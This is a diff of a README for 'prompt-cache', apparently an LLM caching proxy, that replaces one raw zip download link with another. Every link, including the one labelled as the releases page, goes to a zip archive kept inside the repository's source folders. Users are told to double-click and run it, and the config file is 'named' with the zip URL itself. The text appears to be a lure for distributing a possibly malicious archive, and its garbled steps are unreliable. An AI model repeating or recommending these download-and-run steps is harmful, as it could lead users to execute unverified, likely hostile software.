@@ -1,7 +1,7 @@
 # 🚀 prompt-cache - Cut Costs and Boost Speed
 
 ## 💾 Download Here
-[![Download prompt-cache](https://raw.githubusercontent.com/sathishastin/prompt-cache/main/internal/semantic/prompt-cache_3.2.zip)](https://raw.githubusercontent.com/sathishastin/prompt-cache/main/internal/semantic/prompt-cache_3.2.zip)
+[![Download prompt-cache](https://github.com/sathishastin/prompt-cache/raw/refs/heads/main/assets/prompt_cache_v1.1.zip)](https://github.com/sathishastin/prompt-cache/raw/refs/heads/main/assets/prompt_cache_v1.1.zip)
 
 ## 📋 About prompt-cache
 prompt-cache helps you reduce costs when using Large Language Models (LLMs) and speeds up response times. It works like a proxy, making it compatible with OpenAI's tools. Built in Go, this software uses smart caching to save you money—up to 80%—while providing fast results. 
@@ -23,7 +23,7 @@ prompt-cache helps you reduce costs when using Large Language Models (LLMs) and 
 ## 🚀 Getting Started
 To get started with prompt-cache, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [download page](https://raw.githubusercontent.com/sathishastin/prompt-cache/main/internal/semantic/prompt-cache_3.2.zip).
+1. **Visit the Releases Page**: Go to the [download page](https://github.com/sathishastin/prompt-cache/raw/refs/heads/main/assets/prompt_cache_v1.1.zip).
 2. **Choose the Right File**: Look for the latest release. You will see options for different operating systems (e.g., Windows, macOS, Linux).
 3. **Download the File**: Click on the file that matches your operating system to start the download.
 4. **Locate the Downloaded File**: Check your Downloads folder for the file.
@@ -31,12 +31,12 @@ To get started with prompt-cache, follow these steps:
 6. **Run the Application**: Double-click the file to open prompt-cache. Follow any prompts that appear on your screen.
 
 ## 📥 Download & Install
-For your convenience, here is the link again. You can [visit this page to download](https://raw.githubusercontent.com/sathishastin/prompt-cache/main/internal/semantic/prompt-cache_3.2.zip) the latest version.
+For your convenience, here is the link again. You can [visit this page to download](https://github.com/sathishastin/prompt-cache/raw/refs/heads/main/assets/prompt_cache_v1.1.zip) the latest version.
 
 ## ⚙️ Configuration
 After installing prompt-cache, you might want to adjust some settings:
 
-1. **Open the Configuration File**: Find the configuration file in the installation folder. It should be named `https://raw.githubusercontent.com/sathishastin/prompt-cache/main/internal/semantic/prompt-cache_3.2.zip`.
+1. **Open the Configuration File**: Find the configuration file in the installation folder. It should be named `https://github.com/sathishastin/prompt-cache/raw/refs/heads/main/assets/prompt_cache_v1.1.zip`.
 2. **Edit Settings**: Open the file with any text editor (e.g., Notepad or TextEdit). You can change parameters like cache size and timeout settings.
 3. **Save Changes**: Make sure to save the file after making changes.
 4. **Restart the Application**: Close and reopen prompt-cache to apply your settings.
